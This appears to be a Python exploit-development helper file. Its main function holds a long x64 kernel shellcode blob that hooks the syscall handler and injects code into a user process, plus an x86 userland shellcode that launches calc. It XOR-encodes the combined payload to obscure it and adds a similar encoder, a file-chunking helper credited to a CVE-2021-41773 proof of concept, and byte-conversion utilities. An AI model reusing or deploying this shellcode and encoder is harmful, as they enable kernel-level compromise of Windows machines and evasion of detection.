#more functions that we might need

def test_shellcode_builder():
    kernel_shellcode = "\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
    kernel_shellcode += "\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
    kernel_shellcode += "\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10"
    kernel_shellcode += "\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x50\x53\x51\x52"
    kernel_shellcode += "\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41"
    kernel_shellcode += "\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10\x00\x00\x00\x41\x53\x6A"
    kernel_shellcode += "\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55\x48\x81\xEC\x58\x01\x00"
    kernel_shellcode += "\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48\x89\x9D\xC0\x00\x00\x00"
    kernel_shellcode += "\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5\xD0\x00\x00\x00\x48\xA1"
    kernel_shellcode += "\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89\xC2\x48\xC1\xEA\x20\x48"
    kernel_shellcode += "\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00\x00\xC0\x0F\x30\xFB\xE8"
    kernel_shellcode += "\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x48\x83"
    kernel_shellcode += "\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59"
    kernel_shellcode += "\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65\x48\x8B\x24\x25\x10\x00"
    kernel_shellcode += "\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F\xD0\xFF\x56\x41\x57\x41"
    kernel_shellcode += "\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5\x66\x83\xE4\xF0\x48\x83"
    kernel_shellcode += "\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65\x4C\x8B\x3C\x25\x38\x00"
    kernel_shellcode += "\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C\x49\xC1\xE7\x0C\x49\x81"
    kernel_shellcode += "\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81\xFE\x4D\x5A\x75\xEF\x41"
    kernel_shellcode += "\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00\x48\x89\xC6\x48\x81\xC6"
    kernel_shellcode += "\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30\xE8\x03\x02\x00\x00\x48"
    kernel_shellcode += "\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90\x00\x05\x00\x00\x48\x39"
    kernel_shellcode += "\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B\x36\x48\x39\xCE\x75\xE2"
    kernel_shellcode += "\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04\x81\xF9\x00\x00\x01\x00"
    kernel_shellcode += "\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89\xCB\x41\xBB\x66\x55\xA2"
    kernel_shellcode += "\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB\x49\x8B\x0E\x41\xBB\xA3"
    kernel_shellcode += "\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89\xC6\xE8\x50\x01\x00\x00"
    kernel_shellcode += "\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49\x8B\x1E\x4D\x8D\x6E\x10"
    kernel_shellcode += "\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24\x11\xDC\xE8\x81\x01\x00"
    kernel_shellcode += "\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D\x4E\x08\x49\xC7\x01\x00"
    kernel_shellcode += "\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31\xC9\x48\x89\x0A\x48\xF7"
    kernel_shellcode += "\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC\x20\xE8\x52\x01\x00\x00"
    kernel_shellcode += "\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B\x3E\x48\x8D\x35\xE9\x00"
    kernel_shellcode += "\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00\x00\x66\x81\xC1\xF9\x00"
    kernel_shellcode += "\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03\x00\x00\x48\x89\xF1\x48"
    kernel_shellcode += "\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1\x48\x83\xEC\x20\x41\xBB"
    kernel_shellcode += "\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48\x83\xC4\x20\x5A\x59\x48"
    kernel_shellcode += "\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00\x00\x48\x85\xC0\x74\x0C"
    kernel_shellcode += "\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05\x72\x05\x48\x8B\x09\xEB"
    kernel_shellcode += "\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2\x80\xC2\x90\x31\xC9\x41"
    kernel_shellcode += "\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00\x48\x89\xC1\x4C\x8D\x89"
    kernel_shellcode += "\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89\xE2\x49\x89\xC4\x4D\x31"
    kernel_shellcode += "\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41\x50\x48\x83\xEC\x20\x41"
    kernel_shellcode += "\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00\x31\xD2\x52\x52\x41\x58"
    kernel_shellcode += "\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09\x9E\xE8\x82\x00\x00\x00"
    kernel_shellcode += "\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8\x74\x00\x00\x00\x48\x89"
    kernel_shellcode += "\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00\x00\x00\x48\x89\xEC\x5D"
    kernel_shellcode += "\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E\xC3\xE9\xB5\x00\x00\x00"
    kernel_shellcode += "\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D\x3C\x61\x7C\x02\x2C\x20"
    kernel_shellcode += "\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2\x65\x48\x8B\x52\x60\x48"
    kernel_shellcode += "\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12\x48\x8B\x72\x50\x48\x0F"
    kernel_shellcode += "\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41"
    kernel_shellcode += "\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39\xD9\x75\xDA\x4C\x8B\x7A"
    kernel_shellcode += "\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52\x51\x56\x48\x89\xC2\x8B"
    kernel_shellcode += "\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x01\xD0\x50\x8B"
    kernel_shellcode += "\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48\xFF\xC9\x41\x8B\x34\x88"
    kernel_shellcode += "\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39\xD9\x75\xEC\x58\x44\x8B"
    kernel_shellcode += "\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01"
    kernel_shellcode += "\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59\x5A\x41\x58\x41\x59\x41"
    kernel_shellcode += "\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48\x89\xE5\x48\x83\xEC\x20"
    kernel_shellcode += "\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF\xFF\x31\xC9\x51\x51\x51"
    kernel_shellcode += "\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x20\x41"
    kernel_shellcode += "\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
    kernel_shellcode += "\x5E\xC3"

    userland_shellcode = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
    userland_shellcode += "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
    userland_shellcode += "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
    userland_shellcode += "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
    userland_shellcode += "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
    userland_shellcode += "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
    userland_shellcode += "\x45\x81\x3e\x43\x72\x65\x61\x75"
    userland_shellcode += "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
    userland_shellcode += "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
    userland_shellcode += "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
    userland_shellcode += "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
    userland_shellcode += "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
    userland_shellcode += "\x6c\x63\x89\xe2\x52\x52\x53\x53"
    userland_shellcode += "\x53\x53\x53\x53\x52\x53\xff\xd7"

    #my_str_as_bytes = str.encode(str_val)
    xor_key = "\x58\x58\x11\x62"

    userland_shellcode_len = len(userland_shellcode)
    userland_shellcode_size_str = format(userland_shellcode_len, "x")
    
    kernel_shellcode += userland_shellcode_size_str
    kernel_shellcode += userland_shellcode
    length = len(kernel_shellcode)
    
    cipher_payload = ""
    for i in range(length):
        t = kernel_shellcode[i]
        k = xor_key[i % len(xor_key)]
        x = ord(k) ^ ord(t)
        ordinal = "%02x" % x
        cipher_payload += ''.join(ordinal)
    #print(cipher_payload)

    encoded_payload = cipher_payload.encode()
    byte_payload = bytearray(encoded_payload)
    print(byte_payload)

def XOR_ENCRYPT3():
    #sample payload
    payload = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    xor_key = "\x58\x58\x11\x62"

    length = len(payload)

    cipher_payload = ""
    for i in range(length):
        t = payload[i]
        k = xor_key[i % len(xor_key)]
        x = ord(k) ^ ord(t)
        ordinal = "%02x" % x
        cipher_payload += ''.join(ordinal)
    print(cipher_payload)
    
    #manipulate the packet further here
    encoded_payload = cipher_payload.encode()
    byte_payload = bytearray(encoded_payload)

'''
for chunkStart, chunkSize in chunkify(self.file):
            #pool.apply_async(process_wrapper, (chunkStart, chunkSize, self.file))
        try:
'''
#https://github.com/iilegacyyii/PoC-CVE-2021-41773/blob/main/CVE-2021-41773.py
def chunkify(fname,chunkSize=4096):
    fileEnd = path.getsize(fname)
    with open(fname,'rb') as f:
        chunkEnd = f.tell()
        while True:
            chunkStart = chunkEnd
            f.seek(chunkSize,1)
            f.readline()
            chunkEnd = f.tell()
            yield chunkStart, chunkEnd - chunkStart
            if chunkEnd > fileEnd:
                break

#https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
def le2int(buf):
    """little endian buffer to integer."""
    integer = 0
    shift = 0
    for byte in buf:
        integer |= ord(byte) << shift
        shift += 8
    return integer

def int2le(integer, pad):
    """integer to little endian buffer."""
    buf = []
    while integer:
        buf.append(chr(integer & 0xff))
        integer >>= 8
        pad -= 1
    while pad > 0:
        buf.append('\x00')
        pad -= 1
    if not buf:
        return '\x00'
    return ''.join(buf)
